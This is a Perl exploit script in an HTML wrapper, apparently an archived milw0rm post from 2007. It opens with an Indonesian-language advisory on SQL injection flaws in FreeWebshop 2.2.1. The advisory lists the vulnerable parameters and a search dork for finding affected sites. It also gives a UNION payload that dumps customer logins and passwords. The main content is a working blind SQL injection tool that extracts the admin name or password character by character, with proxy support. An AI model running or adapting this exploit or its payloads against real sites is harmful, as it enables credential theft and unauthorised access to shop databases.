<html><head><title>FreeWebshop 2.2.1 Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#
# Indonesian Newhack Security Advisory
# ------------------------------------
# FreeWebshop version 2.2.1 - Multiple Remote SQL Injection Vulnerabilities
# Waktu			:  Dec 16 2007 01:50AM
# Software		:  FreeWebshop version 2.2.1
# Vendor		:  http://www.freewebshop.org/
# Demo Site		:  http://www.freewebshop.org/demo/
# Ditemukan oleh	:  k1tk4t  |  http://newhack.org
# Lokasi		:  Indonesia
# Dork			:  &quot;Powered by FreeWebshop.org 2.2.1&quot;
#
#
# - variable &quot;prod&quot; pada &quot;detail&quot; tidak terfilter dengan baik sebelumnya sehingga user dapat memanipulasi sql query melalui browser secara remote
# ;
# http://korban.site/index.php?page=details&amp;prod=[SQLI]&amp;cat=0&amp;group=0
#
# - variable &quot;cat&quot; pada &quot;list&quot; tidak terfilter dengan baik sebelumnya sehingga user dapat memanipulasi sql query melalui browser secara remote
# ;
# http://korban.site/index.php?page=browse&amp;action=list&amp;group=0&amp;cat=[SQLI]&amp;orderby=DESCRIPTION
#
# - variable &quot;group&quot; pada berkas &quot;index.php&quot; tidak terfilter dengan baik sebelumnya sehingga user dapat memanipulasi sql query melalui browser secara remote
# ;
# http://korban.site/index.php?group=[Blind SQLI]&amp;page=categories
#
# Contoh [SQLI] ;
# http://korban.site/index.php?page=browse&amp;action=list&amp;group=0&amp;cat=-1/**/UNION/**/SELECT/**/null,concat(loginname,0x3a,password),null/**/from/**/customer/**/limit/**/0,1/*&amp;orderby=DESCRIPTION
#
#
# Terima Kasih untuk;
# -[opt1lc, fl3xu5, ghoz]-
# str0ke, DNX, xoron, cyb3rh3b, K-159, the_hydra, y3dips
# nyubi,iFX,sin~X,kin9k0ng,bius,selikoer,aldy_BT
# Komunitas Security dan Hacker Indonesia
#
#
# ----------------------------[Blind SQLI]------------------------------------
use LWP::UserAgent;
use Getopt::Long;

if(!$ARGV[1])
{
 print &quot;\n  |-------------------------------------------------|&quot;;
 print &quot;\n  |         Indonesian Newhack Technology           |&quot;;
 print &quot;\n  |-------------------------------------------------|&quot;;
 print &quot;\n  |  MOG-WebShop =&gt; ? (group) Blind SQL Injection   |&quot;;
 print &quot;\n  |     Found by k1tk4t [k1tk4t(at)newhack.org]     |&quot;;
 print &quot;\n  |   DNX Code [dnx(at)hackermail.com] | Modified   |&quot;;
 print &quot;\n  |-------------------------------------------------|&quot;;
 print &quot;\n[!] &quot;;
 print &quot;\n[!] Kutu pada index.php dengan variable (group) yang dapat dimanipulasi secara Blind SQLI&quot;;
 print &quot;\n[!] Penggunaan : perl freewebshop211.pl [Host] [Path] &quot;;
 print &quot;\n[!] Contoh     : perl freewebshop211.pl 127.0.0.1 /WebShop/ -c 2 -o 1&quot;;
 print &quot;\n[!] Options:&quot;;
 print &quot;\n       -c [no]       nilai sebenarnya dari group pada index.php, default 1&quot;;
 print &quot;\n       -o [no]       1 = admin name (default)&quot;;
 print &quot;\n                     2 = admin password&quot;;
 print &quot;\n       -p [ip:port]  Proxy support&quot;;
 print &quot;\n&quot;;
 exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $cat     = 1;
my $column  = &quot;loginname&quot;;
my %options = ();
GetOptions(\%options, &quot;c=i&quot;, &quot;o=i&quot;, &quot;p=s&quot;);

print &quot;[!] Exploiting...\n&quot;;

if($options{&quot;c&quot;}) { $cat = $options{&quot;c&quot;}; }
if($options{&quot;o&quot;} &amp;&amp; $options{&quot;o&quot;} == 2) { $column = &quot;password&quot;; }

syswrite(STDOUT, &quot;[!] Data : &quot;, 12);

for(my $i = 1; $i &lt;= 32; $i++)
{
 my $found = 0;
 my $h = 48;
 while(!$found &amp;&amp; $h &lt;= 57)
 {
   if(istrue2($host, $path, $i, $h))
   {
     $found = 1;
     syswrite(STDOUT, chr($h), 1);
   }
   $h++;
 }
 if(!$found)
 {
   $h = 97;
   while(!$found &amp;&amp; $h &lt;= 122)
   {
     if(istrue2($host, $path, $i, $h))
     {
       $found = 1;
       syswrite(STDOUT, chr($h), 1);
     }
     $h++;
   }
 }
}

print &quot;\n[!] Exploit done\n&quot;;

sub istrue2
{
 my $host  = shift;
 my $path  = shift;
 my $i     = shift;
 my $h     = shift;

 my $ua = LWP::UserAgent-&gt;new;
 my $url = &quot;http://&quot;.$host.$path.&quot;index.php?group=&quot;.$cat.&quot;%20AND%20SUBSTRING((SELECT%20&quot;.$column.&quot;%20FROM%20customer%20LIMIT%200,1),&quot;.$i.&quot;,1)=CHAR(&quot;.$h.&quot;)&amp;page=categories&quot;;

 if($options{&quot;p&quot;})
 {
   $ua-&gt;proxy('http', &quot;http://&quot;.$options{&quot;p&quot;});
 }

 my $response = $ua-&gt;get($url);
 my $content = $response-&gt;content;
 my $regexp = &quot;cat.gif&quot;;

 if($content =~ /$regexp/)
 {
   return 1;
 }
 else
 {
   return 0;
 }
}

# milw0rm.com [2007-12-18]</pre></html>